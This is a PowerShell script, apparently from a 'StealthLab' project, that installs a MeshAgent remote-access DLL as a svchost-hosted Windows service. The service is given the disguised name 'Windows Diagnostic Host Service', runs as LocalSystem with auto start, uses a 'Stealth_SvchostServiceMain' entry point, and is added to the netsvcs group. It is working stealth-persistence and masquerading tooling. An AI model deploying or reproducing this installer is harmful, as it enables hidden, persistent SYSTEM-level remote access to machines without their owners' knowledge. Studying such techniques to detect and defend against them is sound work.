#Requires -RunAsAdministrator
[CmdletBinding()]
param(
    [string]$DllSource
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

function Write-Info { param([string]$Message) Write-Host ("[INFO] {0}" -f $Message) -ForegroundColor Gray }
function Write-Ok   { param([string]$Message) Write-Host ("[ OK ] {0}" -f $Message) -ForegroundColor Green }
function Write-Warn { param([string]$Message) Write-Host ("[WARN] {0}" -f $Message) -ForegroundColor Yellow }
function Write-Err  { param([string]$Message) Write-Host ("[ERR ] {0}" -f $Message) -ForegroundColor Red }

$serviceName = "WinDiagnosticHost"
$installDir  = Join-Path $env:SystemRoot "System32\DiagnosticHost"
$dllTarget   = Join-Path $installDir "diagsvc.dll"
$svchostExe  = "%SystemRoot%\System32\svchost.exe"

if (-not $DllSource) {
    $repoRoot = Split-Path -Parent $PSCommandPath
    $DllSource = Join-Path $repoRoot "meshservice\x64\StealthLab_DLL\MeshService-2022.dll"
}

Write-Host "Installing MeshAgent svchost service ($serviceName)..." -ForegroundColor Cyan

if (-not (Test-Path $DllSource)) {
    throw "Source DLL not found: $DllSource. Build StealthLab_DLL first or specify -DllSource."
}

# Ensure installation directory exists
New-Item -ItemType Directory -Path $installDir -Force | Out-Null

# Copy DLL into place
Copy-Item -Path $DllSource -Destination $dllTarget -Force
Write-Ok ("Copied DLL to {0}" -f $dllTarget)

# Create/update service
$serviceExists = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
if (-not $serviceExists) {
    Write-Info "Creating service registration"
    sc.exe create $serviceName binPath= "$svchostExe -k netsvcs -p" type= share start= auto DisplayName= "Windows Diagnostic Host Service" obj= LocalSystem | Out-Null
} else {
    Write-Info "Service already exists, updating configuration"
    sc.exe config $serviceName binPath= "$svchostExe -k netsvcs -p" type= share start= auto obj= LocalSystem | Out-Null
}

# Configure Parameters key
$paramsPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName\Parameters"
New-Item -Path $paramsPath -Force | Out-Null
Set-ItemProperty -Path $paramsPath -Name ServiceDll -Value $dllTarget -Type ExpandString
Set-ItemProperty -Path $paramsPath -Name ServiceMain -Value "Stealth_SvchostServiceMain" -Type String

# Ensure netsvcs membership
$svchostKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
$netsvcs = (Get-ItemProperty -Path $svchostKey -Name "netsvcs").netsvcs
if ($netsvcs -notcontains $serviceName) {
    Set-ItemProperty -Path $svchostKey -Name "netsvcs" -Value ($netsvcs + $serviceName) -Type MultiString
    Write-Info "Added service to svchost netsvcs group"
}

# Start service
Write-Info "Starting service..."
Start-Service -Name $serviceName
Start-Sleep -Seconds 5
$service = Get-Service -Name $serviceName
Write-Ok ("Service state: {0}" -f $service.Status)

$svcDetails = Get-CimInstance Win32_Service -Filter "Name='$serviceName'"
if ($svcDetails.ProcessId) {
    $proc = Get-Process -Id $svcDetails.ProcessId -ErrorAction SilentlyContinue
    if ($proc) {
        Write-Info ("Process ID    : {0}" -f $proc.Id)
        Write-Info ("Process Name  : {0}" -f $proc.Name)
    }
}

Write-Info "Run audit_and_debug_svchost.ps1 to verify deeper integration."

